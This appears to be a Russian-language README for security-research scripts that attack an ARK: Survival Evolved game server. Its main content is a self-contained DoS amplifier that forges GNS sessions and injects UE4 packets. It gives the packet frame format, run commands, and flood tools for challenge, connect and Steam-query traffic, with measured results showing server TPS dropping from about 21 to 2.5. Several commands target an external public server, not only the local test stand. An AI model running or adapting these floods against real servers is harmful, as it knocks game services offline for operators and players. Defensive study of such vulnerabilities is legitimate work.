# Лабораторные скрипты — ARK: Survival Evolved v358, стенд Server2

Все скрипты на Python 3 (на стенде: `C:\Program Files\Python314\python.exe`).
Перед запуском в консоли PowerShell: `$env:PYTHONIOENCODING='utf-8'`, иначе
русские сообщения падают с `UnicodeEncodeError` (консоль в cp1252).

Целевой стенд: `192.168.8.218` — игровой порт `7778`, Steam-query `27016`,
метрики плагина NetGuard `127.0.0.1:27101` (JSON по TCP).
RCON **не используется** как поверхность атаки (только администрирование).

---

## 0. Быстрый старт

```powershell
$env:PYTHONIOENCODING='utf-8'
cd C:\Dev\_research\security

# полный прогон всех сценариев + итоговый рейтинг векторов по мощности
python ark_lab_suite.py --all --seconds 12 --json out\suite.json

# только главный вектор (подделка GNS-сессии + инъекция UE4-пакетов)
python ark_lab_gns_amp.py --count 200000

# внешний сервер (предварительная проверка отработает по его query-порту)
python ark_lab_gns_amp.py --host 23.109.45.13 --game-port 25714 --query-port 25715 --no-metrics --count 200000

# измерить воздействие на удалённый сервер (плагина там нет -> RTT до query-порта)
python ark_lab_remote_probe.py --host 23.109.45.13 --query-port 25715 --seconds 40 --interval 0.2

# текущие метрики сервера
python ark_lab_metrics.py status
```

---

## 1. Главный вектор: подделка GNS-сессии → «1 пакет = 1 `UNetConnection`»

| Скрипт | Что делает |
|---|---|
| **`ark_lab_gns_amp.py`** | **главный амплификатор — файл САМОДОСТАТОЧНЫЙ (только стандартная библиотека Python, можно скопировать на любой хост).** Реализует весь вектор: protobuf-энкодер, обе стадии GNS-рукопожатия, сборку data-пакетов и измерение воздействия. Экспортирует `run_amp()`, который вызывает свит. **Перед атакой автоматически проверяет доступность сервера** (A2S-пинг query-порта + ответ игрового порта на `ChallengeRequest` + доступность плагина метрик) и отказывается работать с кодом 3, если игровой порт не отвечает. |
| `ark_lab_gns_ue4_v2.py` | Вариант с явной отправкой настоящего UE4-хендшейка (4 пакета) и разбором ответов сервера — для отладки протокола. |
| `ark_lab_gns_connect.py` | Стадия 2 отдельно: `ConnectRequest` без `cert` → `ConnectOK` (печатает все поля ответа). |
| `ark_lab_gns_probe.py` | Стадия 1 отдельно: `ChallengeRequest` → `ChallengeReply` (показывает выданный challenge). |
| `ark_lab_gns_conn_flood.py` | Флуд анонимными `ConnectRequest` с N портов: проверка лимита «1 соединение на (IP:порт)», ответы/отказы сервера, память. |
| `ark_lab_gns_challenge_flood.py` | Флуд `ChallengeRequest`: сколько ответов даёт сервер и создаёт ли он состояние (не создаёт). |

Формат кадра (восстановлен побайтово, см. `ARK_SPECIFIC_VECTORS.md` §13–14):

```
[0x20][u16 len][protobuf][pad→512]   ChallengeRequest  ->  [0x21] ChallengeReply
[0x22][protobuf]                      ConnectRequest    ->  [0x23] ConnectOK
[0x80][u32 to_conn_id][u16 seq][0x37][u32 msg_num][UE4-байты]   data-пакеты
```

Предварительная проверка (выполняется автоматически перед атакой):

```
ПРОВЕРКА ДОСТУПНОСТИ СЕРВЕРА
  query-порт (A2S)   : ОТВЕТИЛ, 9 Б [....A....]
  игровой порт (GNS) : ОТВЕТИЛ, challenge=0x693193fec5e4e8f4, протокол V5
  плагин метрик      : доступен (pid=18564, tps=21.5, uptime=10493)
```

Если игровой порт не отвечает — атака не запускается, код возврата 3.
Отключить проверку: `--skip-check`.

Пример вывода `ark_lab_gns_amp.py --count 200000`:

```
наш адрес: 0.0.0.0:63952
GNS-соединение подделано, server_connection_id=0x2ff0a4cc
до : connAttempts=200000 ... tps=21.5
  t=  1.0 с  отправлено=26192  connAttempts=226192  tps=21.6
  ...
после: connAttempts=240000 (+40000, т.е. 24596 соединений/с)  tps=21.5
```

---

## 2. Разбор перехвата (нужен был, чтобы снять барьер)

| Скрипт | Что делает |
|---|---|
| `ark_lab_gns_relay.py` | UDP-релей `127.0.0.2:7778` → `192.168.8.218:7778` с логированием: так перехвачено рукопожатие настоящего клиента (выяснилось, что он шлёт `ConnectRequest` **без** `cert`/`crypt`). |
| `ark_lab_gns_analyze.py` | Разбор перехвата: типы сообщений, `ChallengeReply`, `ConnectRequest` (cert/crypt), `ConnectOK`, `ConnectionClosed`. |
| `ark_lab_gns_datapkt.py` | Разбор data-пакетов GNS: заголовок `UDPDataMsgHdr`, `to_connection_id`, номера пакетов, распределение по размерам. |
| `ark_lab_gns_align.py` | Сопоставление уровней: GNS-payload ↔ UE4-пакеты (используется, чтобы восстановить внутренний фрейминг). |
| `ark_lab_sniff_gns.py` | Сниффер сырого UDP (`SIO_RCVALL`) — **требует прав администратора**. |
| `ark_lab_replay_probe.py` | Реплей настоящего UE4-пакета: сервер отбрасывает (транспортный барьер реален). |
| `ark_lab_remote_probe.py` | Внешний зонд состояния **удалённого** сервера: RTT до его query-порта (плагина NetGuard на чужом сервере нет, поэтому состояние измеряется косвенно). Использован для проверки вектора на внешнем стенде 23.109.45.13:25714. |
| `ark_lab_handshake_capture.py` | Ранняя версия перехвата рукопожатия. |

---

## 3. Базовые векторы (для сравнения в рейтинге)

| Скрипт | Что делает |
|---|---|
| `ark_lab_loadtest.py` | Универсальный генератор нагрузки: сценарии `query`, `query-flood`, `game-flood`, `suite`; `--pps`, `--duration`, `--threads`, `--payload-size`. |
| `ark_lab_fps_saturate.py` | Многоточечный насыщатель игрового порта (несколько источников) + кривая FPS. |
| `ark_lab_fps_hunt.py`, `ark_lab_fpsdrop.py` | Поиск порога деградации TPS при разных темпах/размерах пакета. |
| `ark_lab_a2s_hunt.py`, `a2s_diag.py`, `a2s_probe_shapes.py` | A2S/Steam-query: формы запросов, усиление ответа (x15), диагностика. |
| `ark_lab_deadconn.py` | «Мёртвые» подключения: сколько живёт соединение до закрытия. |
| `ark_lab_l7_probe.py` | L7-поверхности (`ServerCheat` и др.) на уровне приложения. |
| `ark_lab_net.py` | Сетевые примитивы (UDP/TCP хелперы). |
| `ark_lab_watch.py` | Наблюдение за метриками в реальном времени. |
| `rcon_cmd.py` | **Только администрирование** (RCON). Как поверхность атаки RCON не тестировался. |

---

## 4. Метрики и плагин

| Скрипт | Что делает |
|---|---|
| `ark_lab_metrics.py` | TCP-клиент плагина NetGuard: `status`, `ping`, `reset`, `config`, `defense on|off`. Используется всеми остальными скриптами. |

Плагин: `C:\Dev\ARK-Server-Plugins\NetGuard\` → установлен в
`C:\asmdata\Servers\Server2\ShooterGame\Binaries\Win64\ArkApi\Plugins\NetGuard\`.
Даёт `tps`, `tickMs`, `memKB`, `liveConnections`, `connectionAttempts`,
`connectionsRejected`, `preLoginAttempts`, `logins`, `players`, `newConnsPerSec` и др.

---

## 5. Свит и рейтинг

`ark_lab_suite.py` — прогоняет пять сценариев (S1 мусор, S2 `ChallengeRequest`,
S3 `ConnectRequest`, S4 подделка GNS+UE4, S5 A2S) и печатает рейтинг по мощности:

```
#   вектор                              пакетов      pps   TPS до  TPS пик TPS после  мощность цена(пакетов)
1   S4 подделка GNS + UE4-инъекция       254000    25221     21.1      2.5     19.8       88%     100000
2   S2 флуд GNS ChallengeRequest         174400    17392     21.5     21.0     21.2        2%          -
3   S1 мусорный флуд 7778                432000    43103     21.4     21.0     21.2        2%          -
4   S3 флуд GNS ConnectRequest           139024    13864     21.1     20.8     21.1        1%          -
5   S5 флуд Steam-query 27016            428000    42794     21.1     21.0     21.0        0%          -
```

S4 реализован в отдельном файле `ark_lab_gns_amp.py`; свит вызывает его
функцию `run_amp()` (реализация не дублируется).

### 5.1 Строгое измерение по FPS (контрольные сценарии)

`ark_lab_gns_fps_test.py` — сценарии C0 (idle), C1 (мусор), C2 (GNS + мусор в
data), C3 (GNS + UE4-хендшейк). Ключевой результат: **C2 деградирует так же,
как C3** ⇒ эффект даёт обработка GNS-датапакета, а не создание соединений.

`ark_lab_gns_cost.py` — стоимость вариантов пакетов по CPU процесса сервера
(GetProcessTimes):

| вариант | мкс/пакет |
|---|---|
| мусор 64 Б | **10.6** |
| GNS data, 1 unreliable-кадр (payload 6/64/512/1400 Б) | 20–24 (размер payload не влияет) |
| GNS data, 1 reliable-кадр | 20.1 |
| GNS data, 10 unreliable-кадров | 29.1 |
| **GNS data, 10 reliable-кадров** | **39.8** ← самый дорогой |
| GNS ack-кадр | 28.3 |

Порог деградации: ~25 000 pps валидных GNS data-пакетов (TPS 21.7 → 2.5);
мусор требует ~242 000 pps — **в 10 раз дороже**.

### 5.2 Варианты data-пакета GNS (`--variant`)

`ark_lab_gns_amp.py --variant <имя>` и `ark_lab_variant_compare.py` (сравнение
вариантов по FPS локально / по потерям на query-порту удалённо).

| Вариант | МКС/пакет (CPU) | Соединений | TPS мин | Итог |
|---|---|---|---|---|
| `unreliable` (0x37, 1 кадр) | 20–25 | +120 000 | **2.6** | **эффективен** |
| `unreliable-x10` (10 кадров) | 29 | +120 000 | **2.7** | эффективен (то же самое) |
| `blob` (0x81 + protobuf) | 23 | +120 000 | **2.7** | эффективен |
| `mixed` (0x37+0x40+0x90) | 21 | +120 000 | **2.7** | эффективен |
| `reliable` (0x40) | 20 | 0 | 21.1 | **нет эффекта** |
| `reliable-x10` | 40 | 0 | 21.1 | **нет эффекта** (самый дорогой по CPU и бесполезный) |
| `ack` (0x90) | 28 | 0 | 21.1 | **нет эффекта** |

Вывод: деградацию даёт **создание `UNetConnection`** (unreliable-кадр доходит
до UE4 как stateless-connect); reliable/ack-кадры обрабатываются только
транспортом, соединений не создают и FPS не роняют. Значит, самый выгодный
пакет — **обычный unreliable-кадр, 18 байт**.

```powershell
# локально: сравнение вариантов по FPS
python -u C:\Dev\_research\security\ark_lab_variant_compare.py --count 120000 --seconds 10

# удалённо: сравнение по потерям на query-порту (сигнал зашумлён WAN-каналом)
python -u C:\Dev\_research\security\ark_lab_variant_compare.py --host 23.109.45.13 \
    --game-port 25714 --query-port 25715 --count 150000 --seconds 10 --remote
```

Важно: метрика `tps` обновляется на игровом тике, поэтому при сильной деградации
она «отстаёт» — ущерб виден только после флуда (в таблице это колонка `TPS после`).

Режимы S4:

```powershell
# пиковый ущерб (непрерывный поток, ~25k pps) -> TPS 21.1 -> 2.5, мощность 88%
python ark_lab_gns_amp.py --count 200000

# «цена» атаки: обвал начинается на 100 000 пакетах
python ark_lab_gns_amp.py --stepped --burst 20000 --duration 60
```

---

## 6. Отчёты

* `ARK_SPECIFIC_VECTORS.md` — узкоспециализированные векторы (N1–N7), §10–§12 —
  L7, слоты, §13 — транспорт GNS, §14 — реализация главного вектора, §15 — рейтинг.
* `REPORT_ARK_SE_SECURITY.md` — сводный отчёт: стек, измерения, таблица векторов (V1–V7),
  плагин, лабораторные скрипты, рекомендации по защите.
